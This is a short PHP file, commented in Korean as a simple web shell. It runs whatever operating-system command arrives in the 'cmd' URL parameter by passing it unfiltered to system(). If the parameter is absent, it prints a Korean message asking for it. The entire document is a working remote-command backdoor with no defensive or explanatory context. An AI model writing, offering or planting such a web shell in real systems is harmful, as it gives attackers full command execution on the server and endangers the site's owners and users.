<?php
// 간단한 웹셸: GET 파라미터 cmd를 받아서 시스템 명령어 실행
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "cmd 파라미터가 필요합니다.";
}
?>